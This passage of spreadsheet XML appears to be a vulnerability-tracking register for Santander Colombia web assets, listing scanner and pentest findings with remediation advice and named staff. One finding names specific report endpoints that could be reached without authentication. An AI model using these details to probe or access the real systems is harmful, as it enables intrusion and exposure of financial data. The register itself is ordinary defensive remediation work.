usuarios pueden elegir utilizar sus apellidos como una de las respuestas secretas y si esa información se revela y se hace una pregunta al azar sobre el apellido de los usuarios, esto podría llevar a restablecer también su contraseña._x000a__x000a_## Causa raíz del problema_x000a_La aplicación revela el nombre del usuario en el primer paso del restablecimiento de la contraseña cuando los usuarios no verifican la propiedad de la cuenta como si respondieran a una pregunta secreta._x000a__x000a_URL: https://confirming-factoring.santander.com.co/factoring/security/preguntasSeguridadUsuario/generarCuestionarioNuevaContrasena.seam"/>
    <s v="La solicitud no debe devolver ninguna información de identificación personal (**PII**) en páginas no autenticadas, haga lo siguiente, como mínimo, y consulte las referencias:_x000a_- Clasificar los datos procesados, almacenados o transmitidos por una solicitud. Identificar qué datos son sensibles según las leyes de privacidad, los requisitos reglamentarios o las necesidades comerciales._x000a_- Aplicar controles según la clasificación._x000a_- No almacene datos sensibles innecesariamente. Deséchelos tan pronto como sea posible o utilice el sistema de tokenización o incluso el truncamiento que cumple con el PCI DSS. Los datos que no se retienen no pueden ser robados._x000a_- Asegúrese de encriptar todos los datos sensibles en reposo._x000a_- Asegúrese de que los algoritmos, protocolos y claves estándar actualizados y fuertes estén en su lugar; use el manejo de claves adecuado._x000a_- Cifrar todos los datos en tránsito con protocolos seguros como TLS con cifrado de secreto perfecto de avance (PFS), priorización de cifrado por parte del servidor y parámetros seguros. Aplicar la encriptación utilizando directivas como HTTP Strict Transport Security (HSTS)._x000a_- Deshabilitar el almacenamiento en caché para las respuestas que contengan datos sensibles._x000a_- Verificar independientemente la efectividad de la configuración y los ajustes."/>
    <s v="La exposición de datos sensibles puede causar pérdidas financieras a la organización y al individuo afectado. Aparte de eso, esto puede llevar a un secuestro de identidad y para las organizaciones, esto impactará negativamente en la marca."/>
    <d v="2021-01-31T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="146"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="71"/>
    <m/>
    <s v="Dismissed"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-18T00:00:00"/>
    <n v="1982"/>
    <d v="2021-05-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-04-09T00:00:00"/>
    <s v="Content-Security-Policy: Default-src 'self'; font-src *; img-src * data:; script-src * 'unsafe-inline'; style-src * 'unsafe-inline'; frame-src _x000a_https://www.youtube.com/; connect-src https://www.google-analytics.com/_x000a__x000a_font-src: Los asteriscos en la fuente son inseguros. _x000a_img-src: Los asteriscos en la fuente son inseguros,_x000a_script-src: Los asteriscos en la fuente son inseguros,_x000a_style-src: Los asteriscos en la fuente son inseguros,_x000a_plugin-types-objective: Limitación de privilegios de la aplicación (tipos de complementos)._x000a_reporting-objective: Sin directiva de informes en uso._x000a_form-action-objective: Limitación de privilegios de la aplicación (acciones de formulario)._x000a_code-injection-objective: Prevención de inyección de código limitado."/>
    <s v="Elimina cualquier instancia de las directivas &quot;inseguras&quot; y la fuente &quot;blob, datos, sistema de archivos&quot;. Asegúrate de que las directivas de tu CSP están correctamente configuradas._x000a__x000a_font-src: Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido._x000a_img-src: la fuente de &quot;Datos&quot; es insegura. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido._x000a_Elimine &quot;datos:&quot; de la lista de fuentes en su política de seguridad de contenido._x000a_script-src: &quot;Inseguro en línea&quot; es inseguro. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido._x000a_Elimine la palabra clave &quot;inseguro en línea&quot; de su política de seguridad de contenido._x000a_style-src:  &quot;Inseguro en línea&quot; es inseguro. Elimine todas las instancias del carácter de asterisco (*) que sean por sí mismas de su política de seguridad de contenido._x000a_Elimine la palabra clave &quot;inseguro en línea&quot; de su política de seguridad de contenido._x000a_plugin-types-objective: Incluya la directiva de tipos de complementos en su CSP._x000a_reporting-objective:  Incluya una directiva de informes con una ubicación o grupo válido._x000a_form-action-objective: Incluya la directiva de acciones de formulario en su CSP._x000a_code-injection-objective:  No utilice ninguna palabra clave &quot;insegura&quot; y utilice hosts explícitos para las directivas de la lista de fuentes._x000a__x000a_https://www.w3.org/TR/CSP/"/>
    <m/>
    <s v="Sin definir"/>
    <s v="Realizar el cambio representa un impacto muy grande en el activo y tambien un costo muy elevado, asimismo en Bitsight aparece en estado Good, el cual no afecta la metrica del banco."/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="147"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="helicopterdetect10-8"/>
    <m/>
    <x v="72"/>
    <m/>
    <s v="Solved"/>
    <x v="4"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-01-19T00:00:00"/>
    <n v="1981"/>
    <d v="2021-02-18T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="Este cliente no tiene una API para recuperar datos, todos los datos se construyen en el servidor y se muestran al usuario. La autenticación se maneja localmente a través de JavaScript. _x000a__x000a_El cliente valida los controles de acceso a los formularios a través de JavaScript localmente y no en el servidor. Con una simple regla de reemplazo uno podría eludir las restricciones de JavaScript y ver las páginas directamente sin autenticación, por nombrar algunas:_x000a_- /reportes/ReporteDesembolso.seam_x000a_- /informes/InformeDesembolsosProgramados.seam_x000a_- /informes/ReporteDetalleDeudor.seam_x000a_- /informes/ReporteRecaudosEsperados.seam_x000a_- /basico/gerenteList/GerenteList.seam_x000a_- /informes/ReporteInteresesCorrientes.seam_x000a_- /informes/InformesInteresesMora.seam_x000a__x000a_Algunos puntos finales recuperan datos y otros consultan la base de datos.  Cualquier punto final bajo factorización es vulnerable._x000a__x000a_URL: https://confirming-factoring.santander.com.co/factoring/reportes/*_x000a_URL: https://confirming-factoring.santander.com.co/factoring/*"/>
    <s v="Aplicar la validación de la autorización y el control de acceso para cada punto final, asegurando que sólo tengan acceso los usuarios privilegiados correctos."/>
    <s v="Los usuarios no autenticados pueden acceder a todos los formularios de solicitud sin usuario/contraseña. Algunas informaciones divulgadas son:_x000a__x000a_- números de factura_x000a_- números de obligación (identificaciones internas)_x000a_- El atacante podría filtrar por fecha todos los desembolsos realizados por la compañía_x000a_- Tipo de desembolsos_x000a_- valor de los desembolsos_x000a_- números de obligación (identificaciones internas)_x000a__x000a_Cualquier punto final bajo factorización es vulnerable."/>
    <d v="2021-02-28T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="148"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-08cd7585-2ac2-44a5-8260-1c75fa180fac"/>
    <m/>
    <x v="73"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-02T00:00:00"/>
    <n v="1967"/>
    <d v="2021-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-12T00:00:00"/>
    <s v="La cookie no contiene el atributo ;HTTPOnly;._x000a_https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam"/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;HTTPOnlyt; a las cookies."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="149"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-cd011e8e-eb16-4dc3-be53-2af3cb2ab043"/>
    <m/>
    <x v="74"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-02T00:00:00"/>
    <n v="1967"/>
    <d v="2021-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-12T00:00:00"/>
    <s v="La cookie no contiene el atributo ;secure;._x000a_https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam"/>
    <s v="Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo ;secure; a las cookies y obligue a que todas las solicitudes sensibles se envíen a través de HTTPS."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="150"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-0ab48c5e-7ff1-42d7-afd4-9b39cee80aed"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-02T00:00:00"/>
    <n v="1967"/>
    <d v="2021-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-08T00:00:00"/>
    <s v="La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página._x000a_Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo._x000a_https://confirming-factoring.santander.com.co/factoring/error.htm?_event_transid=257341446"/>
    <s v="La opción &quot;X-Frame-Options:&quot; permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer &quot;X-FRAME-OPTIONS a DENY&quot; que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN._x000a__x000a_Configurar &quot;X-FRAME-OPTIONS&quot; como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="151"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-a934536d-b539-454b-b3af-d8ce5281c57e"/>
    <m/>
    <x v="75"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-02T00:00:00"/>
    <n v="1967"/>
    <d v="2021-06-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-02-10T00:00:00"/>
    <s v="La cookie de sesión no contiene el atributo &quot;secure&quot;_x000a_https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/framework.pack.js.seam"/>
    <s v="Aplique el atributo &quot;seguro&quot; a las cookies de sesión para garantizar que se envíen únicamente a través de HTTPS."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="152"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-5b5c2d0e-30cb-4f37-932b-92b669bb19bb"/>
    <m/>
    <x v="59"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2021-02-02T00:00:00"/>
    <n v="1967"/>
    <d v="2021-05-03T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-09-20T00:00:00"/>
    <s v="Se descubrió un archivo, directorio o listado de directorios potencialmente sensible en el servidor web._x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fcommon%2f"/>
    <s v="Compruebe que el acceso a este archivo o directorio está permitido. Si es necesario, elimínelo o aplique controles de acceso a él."/>
    <m/>
    <d v="2021-08-19T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="153"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-94f199d9-9d91-4534-9b1c-9f6db6dd48dc"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/a4j/s/3_3_3.Final/org/richfaces/skin.xcss/DATB/eAELXT5DOhSIAQ!sA18_.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO"/>
    <s v="Los mecanismos de prevención de clickjacking más comunes son_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para evitar que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="154"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-4782e1b9-e737-47ec-9ebd-753cef67a0dd"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página._x000a_Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/a4j/s/3_3_3.Final/org/richfaces/skin.xcss/DATB/eAELXT5DOhSIAQ!sA18_.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO"/>
    <s v="La opción &quot;X-Frame-Options:&quot; permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer &quot;X-FRAME-OPTIONS a DENY&quot; que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN._x000a__x000a_Configurar &quot;X-FRAME-OPTIONS&quot; como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI._x000a_Para más información, consulte https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para ver más errores de implementación de X-FRAME-OPTION, visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a_"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="155"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-68dcae4b-7ade-4ae7-9372-3d9aaa772df2"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/common/mainPages/error.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO"/>
    <s v="Los mecanismos de prevención de clickjacking más comunes son_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para evitar que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="156"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-a226d9da-3cf6-4134-b3d1-278f81927f23"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página._x000a_Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/common/mainPages/error.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO"/>
    <s v="La opción &quot;X-Frame-Options:&quot; permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer &quot;X-FRAME-OPTIONS a DENY&quot; que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN._x000a__x000a_Configurar &quot;X-FRAME-OPTIONS&quot; como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI._x000a_Para más información, consulte https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para ver más errores de implementación de X-FRAME-OPTION, visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger_x000a_"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="157"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-f8bc994f-cd2b-4f55-8409-5b248f3d809e"/>
    <m/>
    <x v="76"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La página web puede estar enmarcada. Esto significa que los ataques de clickjacking contra los usuarios son posibles._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/common/mainPages/main.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO&amp;cid=1883&amp;conversationPropagation=end"/>
    <s v="Los mecanismos de prevención de clickjacking más comunes son_x000a_X-Frame-Options: Se trata de una cabecera de respuesta HTTP que se utiliza para evitar el framing de la página web._x000a_Código JavaScript Framekiller: Se puede utilizar un código JS especial para evitar que un usuario malintencionado enmarque la página. Este método es menos fiable que el uso de X-Frame-Options."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="158"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-WAS-d3918046-2c87-4917-9a1b-723b19c488b7"/>
    <m/>
    <x v="65"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-02-22T00:00:00"/>
    <n v="1947"/>
    <d v="2021-05-23T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-02T00:00:00"/>
    <s v="La cabecera X-Frame-Options no se establece en la respuesta HTTP, lo que puede llevar a un posible framing de la página._x000a_Un atacante puede engañar a los usuarios para que hagan clic en un enlace malicioso enmarcando la página original y mostrando una capa sobre ella con botones de aspecto legítimo._x000a__x000a_https://confirming-factoring.santander.com.co/factoring/common/mainPages/main.seam?FACTBOTTKNCSR=RLM3-5CGH-5OR8-A16I-QQKR-WKN0-2HVI-6ODO&amp;cid=1883&amp;conversationPropagation=end"/>
    <s v="La opción &quot;X-Frame-Options:&quot; permite tres opciones DENY, SAMEORIGIN y ALLOW-FROM. Se recomienda establecer &quot;X-FRAME-OPTIONS a DENY&quot; que no permitirá que ningún dominio enmarque el sitio o SAMEORIGIN que sólo permite el enmarcado por el mismo sitio. Todos los navegadores soportan DENY y SAMEORGIN._x000a__x000a_Configurar &quot;X-FRAME-OPTIONS&quot; como ALLOW-FROM puede dejar a los usuarios vulnerables al Clickjacking ya que no todos los navegadores soportan ALLOW-FROM incluyendo CHROME y SAFARI._x000a_Para más información, consulte https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet._x000a_Para ver más errores de implementación de X-FRAME-OPTION, visite el siguiente enlace: _x000a_https://blog.qualys.com/securitylabs/2015/10/20/clickjacking-a-common-implementation-mistake-that-can-put-your-websites-in-danger"/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="159"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="77"/>
    <m/>
    <s v="Solved"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-03-04T00:00:00"/>
    <n v="1937"/>
    <d v="2021-07-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-04-24T00:00:00"/>
    <s v="La zona principal no está firmada._x000a__x000a_La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio._x000a__x000a_Tipo de registro: NSEC3_x000a_Algoritmo hash: SHA1_x000a_Banderas: Optar por no_x000a_Iteraciones: 1_x000a_Hash anterior: N5B6GC4NA9Q3JSO7SFOD3L5HC67VSTPO_x000a_Grabar Hash: LOGPGKBREB3R76EEMJO28KDBFTRJ4E9N_x000a_Siguiente hash: N5BEVQEU1FUHADAAV7KCKOBL9EEJ9TBL_x000a_Sal: F873A2F5"/>
    <s v="https://blog.inittab.org/administracion-sistemas/dnssec-asegurando-las-respuestas-de-nuestro-dominio-la-practica-ii/"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="160"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="bancosantander.com.co"/>
    <m/>
    <m/>
    <x v="77"/>
    <m/>
    <s v="Dismissed"/>
    <x v="5"/>
    <m/>
    <m/>
    <m/>
    <s v="bancosantander.com.co"/>
    <m/>
    <m/>
    <d v="2021-03-04T00:00:00"/>
    <n v="1937"/>
    <d v="2021-07-02T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La zona principal no está firmada._x000a__x000a_La zona principal devuelve un registro NSEC o NSEC3 para demostrar que DNSSEC no está configurado en un dominio._x000a__x000a_Tipo de registro: NSEC3_x000a_Algoritmo hash: SHA1_x000a_Banderas: Optar por no_x000a_Iteraciones: 1_x000a_Hash anterior: N5B6GC4NA9Q3JSO7SFOD3L5HC67VSTPO_x000a_Grabar Hash: 04RV0SHP2L0KKFEV063LIB9BBF0E3MP7_x000a_Siguiente hash: N5BEVQEU1FUHADAAV7KCKOBL9EEJ9TBL_x000a_Sal: F873A2F5"/>
    <s v="https://blog.inittab.org/administracion-sistemas/dnssec-asegurando-las-respuestas-de-nuestro-dominio-la-practica-ii/"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jorge Arturo Guzman Sanchez"/>
  </r>
  <r>
    <n v="161"/>
    <s v="BSNC"/>
    <s v="BitSight"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <m/>
    <m/>
    <x v="78"/>
    <m/>
    <s v="Solved"/>
    <x v="5"/>
    <m/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="80"/>
    <m/>
    <d v="2021-03-09T00:00:00"/>
    <n v="1932"/>
    <d v="2021-07-07T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-04-24T00:00:00"/>
    <s v="Servicio detectado: HTTP (potencial vulnerabilidad de ROBOT)_x000a_ROBOT es una vulnerabilidad de RSA que permite a los atacantes registrar pasivamente el tráfico y luego descifrarlo._x000a__x000a_Método de transporte:TCP_x000a_Servidor: BigIP_x000a_Destino de redireccionamiento: https://www.santander.com.co_x000a_Estado: HTTP / 1.0 302 movido temporalmente"/>
    <s v="Actualice todos los paquetes de software y hardware afectados que sean vulnerables a esta vulnerabilidad. Consulte la lista de proveedores empresariales afectados que han publicado actualizaciones que corrigen esta vulnerabilidad. Si los parches no están disponibles para el hardware de la organización, desactive los cifrados que comienzan con TLS_RSA._x000a__x000a_https://robotattack.org/#patches"/>
    <m/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="162"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-VM--8955446863370336762"/>
    <m/>
    <x v="25"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="204.93.139.149"/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2021-03-11T00:00:00"/>
    <n v="1930"/>
    <d v="2021-06-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2021-03-12T00:00:00"/>
    <s v="Este QID informa de la ausencia de las siguientes cabeceras HTTP según CWE-693: Fallo del mecanismo de protección:_x000a_X-Frame-Options: Esta cabecera de respuesta HTTP mejora la protección de las aplicaciones web contra los ataques de clickjacking. El clickjacking, también conocido como &quot;ataque de redireccionamiento de la interfaz de usuario&quot;, permite a un atacante utilizar múltiples capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace en otra página cuando su intención era hacer clic en la página de nivel superior. _x000a_Protección X-XSS: Esta cabecera HTTP activa el filtro de Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de cross-site scripting. Protección X-XSS: 0; desactiva esta funcionalidad._x000a_X-Content-Type-Options: Esta cabecera HTTP evita los ataques basados en la falta de coincidencia del tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. _x000a_Strict-Transport-Security: La cabecera de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que sólo debe comunicarse con él utilizando HTTPS, en lugar de utilizar HTTP._x000a_Lógica de detección de QID:_x000a_Este QID no autenticado busca la presencia de las siguientes respuestas HTTP:_x000a_Las directivas válidas para X-Frame-Options son:_x000a_X-Frame-Options: DENY - La página no puede mostrarse en un marco, independientemente de que el sitio lo intente._x000a_X-Frame-Options: SAMEORIGIN - La página sólo puede mostrarse en un marco del mismo origen que la propia página._x000a_X-Frame-Options: ALLOW-FROM RESOURCE-URL - La página sólo puede mostrarse en un marco en el origen especificado._x000a_Las directivas válidas 